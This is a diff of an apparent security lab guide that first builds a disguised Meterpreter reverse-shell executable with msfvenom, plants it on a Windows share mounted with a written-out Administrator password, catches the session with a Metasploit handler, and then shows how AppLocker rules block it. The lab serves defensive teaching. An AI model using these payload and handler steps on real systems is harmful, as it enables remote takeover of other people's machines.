@@ -43,65 +43,70 @@ Please note that my adapter is called **"eth0"** and my IP address is **"10.10.1
 
 First, we need to run the following command in order to mount our remote system to the correct directory:
 
-`mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh`
+<pre>mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
+
+Note: The IP address of `10.10.1.209` does not need to be changed in this command.
+
+If you see the following error, it means that the device is already mounted.
+
+![](attachments/mounterror.png)
+
+If this is the case, just run the following command to navigate into the mounted directory:
+
+<pre>cd /mnt/windows-share</pre>
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
--f exe -o /tmp/TrustMe.exe`
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 
+-f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
-`cd /tmp`
+Now let's start the **Metasploit Handler**.  First, open a new Kali instance. The easiest way to do this is by clickin on the Kali icon in the taskbar.
 
-`ls -l TrustMe.exe`
+![](attachments/TaskbarKaliIcon.png)
 
-`cp ./TrustMe.exe /mnt/c/tools`
+Before doing anything else, we need to run the following command in our new terminal window:
 
-Let's start the **Metasploit Handler**.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
+<pre>msfconsole -q</pre>
 
-This is what your terminal will look like before getting root.  
+![](attachments/msfconsole.png)
 
-==root@DESKTOP-I1T2G01:/tmp#== `msfconsole -q`
+The Metasploit Handler successfully ran if the terminal now starts with `msf6 >`
 
-Let's become root.
+Next, let's run the following:
+<pre>use exploit/multi/handler</pre>
 
-`sudo su -`
+Now run all of the following commands to set the correct parameters:
 
-==msf5== > `use exploit/multi/handler`
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-The Metasploit Handler successfully ran if the terminal now starts with "**msf5**"
-
-msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
-
-PAYLOAD => windows/meterpreter/reverse_tcp
-
-msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
+<pre>set LHOST 10.10.1.117</pre>
 
 Remember, your IP will be different!
 
-msf5 exploit(multi/handler) > `exploit`
+<pre>exploit</pre>
 
 It should look like this:
 
-![](attachments/Clipboard_2020-06-12-12-46-10.png)
+![](attachments/msf6commands.png)
 
 
 Now, let’s download the malware and run it!
 
-First, let's open a Windows command prompt.  Simply select the down carrot from the Windows Terminal and select Command Prompt.
+First, let's open a Windows command prompt. Do this by clicking on the icon in the taskbar.
+
+![](attachments/OpeningWindowsCommandPrompt.png)
 
 Once the prompt is open, let's run the following commands to run the TrustMe.exe file.
 
-`cd \tools`
+<pre>cd \</pre>
 
+<pre>TrustMe.exe</pre>
 
-Then, run it.
+![](attachments/runtrustme.png)
 
-`TrustMe.exe`
+Back at your Kali terminal, you should now have a metasploit session!
 
-
-Back at your Ubuntu prompt, you should have a metasploit session!
-
-![](attachments/Clipboard_2020-06-12-12-55-11.png)
+![](attachments/meterpretersession.png)
 
 
 Now, let’s stop this from happening!
@@ -110,51 +115,59 @@ First, let’s configure AppLocker.  To do this we will need to access the Local
 
 Simply press the Windows key (lower left hand of your keyboard, looks like a Windows Logo)  then type Local Security.  It should bring up a menu like the one below, please select Local Security Policy.
 
-![](attachments/Clipboard_2020-06-12-12-55-55.png)
+![](attachments/localsecuritypolicy.png)
 
 
 Next, we will need to configure AppLocker.  To do this, please go to Security Settings > Application Control Policies and  then AppLocker.
 
 
-![](attachments/Clipboard_2020-06-12-12-57-02.png)
+![](attachments/localsecpolicywindow.png)
 
 
 
-In the right hand pane, you will see there are 0 Rules enforced for all policies.  We will add in the default rules.  We will choose the defaults because we are far less likely to brick a system.
+Scroll down in the right hand pane. You will see there are 0 Rules enforced for all policies.  We will add in the default rules.  We will choose the defaults because we are far less likely to brick a system.
 
-![](attachments/Clipboard_2020-06-12-12-58-38.png)
+![](attachments/rulesoverview.png)
 
 
 Please select each of the above Rule groups (Executable, Windows Installer, Script and Packaged) and for each one, right click in the area that says “There are no items to show in this view.” and then select “Create Default Rules”
 
 
-![](attachments/Clipboard_2020-06-12-12-59-57.png)
+![](attachments/createdefaultrules.png)
 
 This should generate a subset of rules for each group.  It should look similar to how it does below: 
 
 
-![](attachments/Clipboard_2020-06-12-13-00-24.png)
+![](attachments/appliedrules.png)
+
+For simplicity, you can click the next set of rules from the left panel as seen above.
 
 Next, we need to enforce the rules:
 
 
 To do this you will need to select AppLocker on the far left pane.  Then, you will need to select Configure rule enforcement.  This will open a pop-up, you will need to check Configured for each set of rules
 
-![](attachments/Clipboard_2020-06-23-10-45-07.png)
+![](attachments/ruleenforcement.png)
 
 
 
-Now, we will need to start the Application Identity service.  This is done through pressing the Windows key and typing Services.  This will bring up the Services App.  Please select that and then double-click “Application Identity.”
+Now, we will need to start the Application Identity service.  This is done through pressing the Windows key and typing Services.  
 
-![](attachments/Clipboard_2020-06-12-13-00-54.png)
+![](attachments/services.png)
+
+This will bring up the Services App.  Please select that and then double-click “Application Identity.”
+
+![](attachments/applicationidentity.png)
 
 Once the Application Identity Properties dialog is open, please press the Start button.  This will start the service.
 
-![](attachments/Clipboard_2020-06-12-13-01-27.png)
+![](attachments/startservice.png)
 
-Next, open a command prompt and run gpupdate to force the policy change
+Next, open a command prompt and run gpupdate to force the policy change.
 
-C:\ `gpupdate /force`
+![](attachments/OpeningWindowsCommandPrompt.png)
+
+<pre>gpupdate /force</pre>
 
 Next, log out as ADHD and log back in as allowlist.  
 
